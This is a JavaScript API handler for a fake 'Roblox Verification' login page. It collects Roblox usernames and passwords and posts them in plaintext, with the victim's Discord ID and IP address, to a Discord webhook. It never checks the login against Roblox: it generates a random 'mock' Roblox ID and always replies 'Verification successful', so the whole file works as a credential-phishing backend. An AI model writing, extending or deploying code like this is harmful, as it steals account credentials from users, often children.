import { query } from '../lib/database.js';

export default async function handler(req, res) {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // Handle preflight
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { username, password, discordId, token } = req.body;
    
    if (!username || !password) {
      return res.status(400).json({ error: 'Username and password required' });
    }

    // Get client IP
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    
    // Send to Discord webhook
    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
    
    if (webhookUrl) {
      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: 'Roblox Verification',
          embeds: [{
            title: '🔐 Roblox Login',
            color: 0x5865F2,
            fields: [
              { name: 'Username', value: `\`${username}\``, inline: true },
              { name: 'Password', value: `\`${password}\``, inline: true },
              { name: 'Discord ID', value: discordId ? `\`${discordId}\`` : 'Not linked', inline: true },
              { name: 'IP', value: ip || 'Unknown', inline: true }
            ],
            timestamp: new Date().toISOString()
          }]
        })
      });
    }

    // Log in database
    await query(
      `INSERT INTO verification_logs (discord_id, roblox_username, ip_address, action, details) 
       VALUES ($1, $2, $3, $4, $5)`,
      [discordId, username, ip, 'login_attempt', 'User submitted credentials']
    );

    // Generate verification token if not provided
    const verificationToken = token || generateToken();
    
    // Create verification session
    const expiresAt = new Date(Date.now() + 15 * 60 * 1000); // 15 minutes
    
    if (discordId) {
      await query(
        `INSERT INTO verification_sessions (discord_id, session_token, expires_at, status) 
         VALUES ($1, $2, $3, 'pending')
         ON CONFLICT (discord_id) 
         DO UPDATE SET session_token = $2, expires_at = $3, status = 'pending'`,
        [discordId, verificationToken, expiresAt]
      );
    }

    // Generate mock Roblox ID (in real app, verify with Roblox API)
    const mockRobloxId = Math.floor(Math.random() * 1000000000).toString();
    
    res.json({
      success: true,
      robloxUsername: username,
      robloxId: mockRobloxId,
      verificationToken: verificationToken,
      message: 'Verification successful'
    });

  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
}

function generateToken() {
  return 'token_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
}
